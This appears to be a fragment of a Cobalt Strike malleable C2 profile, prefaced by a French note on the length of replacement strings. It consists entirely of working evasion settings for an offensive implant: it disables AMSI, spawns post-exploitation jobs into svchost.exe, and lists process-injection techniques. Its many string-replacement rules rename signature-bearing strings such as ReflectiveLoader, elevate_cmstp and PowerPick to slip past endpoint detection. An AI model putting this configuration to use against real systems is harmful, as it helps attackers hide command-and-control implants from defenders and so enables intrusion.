

> [!Attention]
> Les strings remplacés doivent faire la même longueur que l'original ou être plus courts.


```
stage {
  set userwx "false";
  set module_x64 "Hydrogen.dll"; # use a different module if you like
  set copy_pe_header "false";
}

post-ex {
  set pipename "dotnet-diagnostic-#####, ########-####-####-####-############";
  set amsi_disable "true";
  set spawnto_x86 "%windir%\\syswow64\\svchost.exe"; 
  set spawnto_x64 "%windir%\\sysnative\\svchost.exe";
  set obfuscate "true";
  set cleanup "true";
  set smartinject "true";

  transform-x64 {
      strrep "ReflectiveLoader" "NetlogonMain";
	  strrep "Failed" "Fails";
	  strrep "failed" "fails";
	  strrep "success" "succeed";
	  strrep "is alive." "is up.";
	  strrep "is complete" "finished";
	  strrep "Could not" "Kannot";
	  strrep "could not" "kannot";
	  strrep "elevate_cmstp" "elev_cmstp";
	  strrep "OLDNAMES" "OLDNAMS";
	  strrep "_willAutoElevate" "_wilOtoElevate";
	  strrep "devcenter" "center";
	  strrep "__imp" "__omp";
	  strrep "_RunAsAdmin" "_RunAsAdm";
	  strrep "_SpawnAsAdmin" "_SpawnAsAdm";
	  strrep "_SpawnAsAdminX64" "_SpawnAsAdm64";
	  strrep "Adobe APP14" "Adobe APP";
	  strrep "is_admin" "is_adm";
	  strrep "_is_admin_already" "_is_admAlready";
	  strrepex "ExecuteAssembly" "Invoke_3 on EntryPoint failed." "Assembly threw an exception";
      strrepex "PowerPick" "PowerShellRunner" "PowerShellEngine";      
  }
  
  transform-x86 {
      strrep "ReflectiveLoader" "NetlogonMain";
	  strrep "Failed" "Fails";
	  strrep "failed" "fails";
	  strrep "success" "succeed";
	  strrep "is alive." "is up.";
	  strrep "is complete" "finished";
	  strrep "Could not" "Kannot";
	  strrep "could not" "kannot";
	  strrep "elevate_cmstp" "elev_cmstp";
	  strrep "OLDNAMES" "OLDNAMS";
	  strrep "_willAutoElevate" "_wilOtoElevate";
	  strrep "devcenter" "center";
	  strrep "__imp" "__omp";
	  strrep "_RunAsAdmin" "_RunAsAdm";
	  strrep "_SpawnAsAdmin" "_SpawnAsAdm";
	  strrep "_SpawnAsAdminX64" "_SpawnAsAdm64";
	  strrep "Adobe APP14" "Adobe APP";
	  strrep "is_admin" "is_adm";
	  strrep "_is_admin_already" "_is_admAlready";
	  strrepex "ExecuteAssembly" "Invoke_3 on EntryPoint failed." "Assembly threw an exception";
      strrepex "PowerPick" "PowerShellRunner" "PowerShellEngine";   
  }
}

process-inject {
  execute {
      NtQueueApcThread-s;
      NtQueueApcThread;
      SetThreadContext;
      CreateThread;
  }
}

```